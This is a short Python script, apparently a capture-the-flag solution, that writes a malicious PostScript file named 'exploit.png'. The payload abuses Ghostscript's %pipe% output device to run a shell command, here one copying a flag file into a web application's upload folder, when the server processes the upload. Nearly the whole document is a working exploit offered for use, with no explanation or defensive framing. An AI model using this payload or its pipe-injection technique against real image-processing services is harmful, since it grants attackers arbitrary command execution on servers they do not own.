
# UPLOAD_FOLDER = '/app/application/static/petpets' of the vunerable application (example path)

Path = "cat flag >> /app/application/static/petpets/flag.txt"

payload = r"""%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: -0 -0 100 100

userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%{Path-01}) currentdevice putdeviceprops
"""
payload = payload.replace("{Path-01}", Path)

with open("exploit.png", "w+") as r:
    r.write(payload)
    r.close()
print(f"File created: {r.name}")
